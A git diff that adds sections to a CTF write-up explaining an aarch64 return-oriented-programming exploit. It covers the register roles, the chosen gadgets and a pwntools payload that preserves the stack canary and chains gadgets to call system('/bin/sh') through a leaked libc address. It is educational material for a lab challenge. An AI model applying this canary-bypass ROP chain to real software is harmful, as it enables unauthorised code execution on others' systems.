@@ -2,6 +2,8 @@
 
 This was the first time I faced a challenge that was using aarch64 architecture. Unfortunately, I wasn't able to solve this during the CTF but I read the writeups and was able to try it myself.
 
+NOTE : The solve script is the official writeup from the author. This is just my attempt at explaining how to solve this challenge
+
 To be able solve this challenge, we first must set up the environment for the challenge.
 
 ## Setup
@@ -125,3 +127,63 @@ We found that the leak is located inside __libc_start_main at offset 152. We can
 libc_start_main = libc_start_main_leak - 152
 libc.address = libc_start_main - libc.symbols['__libc_start_main']
 ```
+
+## ROP
+
+Before we go into the ROP, we need to first understand the registers in aarch64.
+
+### Registers
+
+x0 to x7 are used to pass arguments, similar to rdi, rsi and rdx
+x29 is similar to rbp
+x30 is stores the return address
+
+### Function Prologue, Epilogue and Stack Layout
+
+For this part, you can read this [writeup](https://d0ublew.github.io/writeups/imaginaryctf-2023/pwn/generic-rop-challenge/index.html)
+
+Now, we need to look for suitable gadgets that can pass in "/bin/sh" into the x0 register and call system()
+
+```
+0x00000000004008f4 # 0x00000000004008f4 : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
+0x0000000000400910 # 0x0000000000400910 : mov x2, sp ; ldp x29, x30, [sp], #0x10 ; ret
+0x000000000040091c : ldr x0, [x2, #0x10] ; ldp x29, x30, [sp], #0x10 ; ret
+```
+
+Fortunately for us, there gadgets are available which lets us mov a value we specify into x2, then load the value from x2 (at a offset of 0x10) into x0
+
+```py
+payload = flat([
+    'a' * 104,
+    canary,
+    'b' * 8,    #x29
+    mov_x2_sp,  #x30
+    'c' * 8,
+    canary,
+    'd' * 8,    #x2     #x29
+    ldr_x19,            #x30
+    binsh,
+    ldr_x0_x2,
+    'e' * 24,
+    libc.symbols['system']
+])
+```
+
+This is what our payload will look like
+
+![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/e9800280-2260-4923-88f8-8450d01f0d8f)
+
+First, we will overflow with the canary, b*8 for x29 and mov_x2_sp for x30. So when main returns, it will return to mov_x2_sp and increment $sp by 32, so the $sp will now point to dddddddd
+
+`mov_x2_sp = 0x0000000000400910 # 0x0000000000400910 : mov x2, sp ; ldp x29, x30, [sp], #0x10 ; ret`
+
+Since $sp point to dddddddd, it will be mov into x2 so x2 = dddddddd, then it will load dddddddd and ldr_x19 into x29, x30 respectively. Then $sp will increment by 16 and will now point to binsh
+
+`ldr_x19 = 0x00000000004008f4 # 0x00000000004008f4 : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret`
+
+Since $sp point to binsh, it will load sp + 16 into x19, so now x19 will point to eeeeeeee. Then, it will load binsh and ldr_x0_x2 into x29, x30 respectively. Then $sp will increment by 32 and will now point to the last 8 eeeeeeee
+
+`ldr_x0_x2 = 0x000000000040091c # 0x000000000040091c : ldr x0, [x2, #0x10] ; ldp x29, x30, [sp], #0x10 ; ret`
+
+Since x2 is pointing to dddddddd, it will load dddddddd + 16, which is binsh into x0. Then, it will load eeeeeeee and libc.symbol['system'] into x29, x30 respectively. Then return to system because its in x30
+
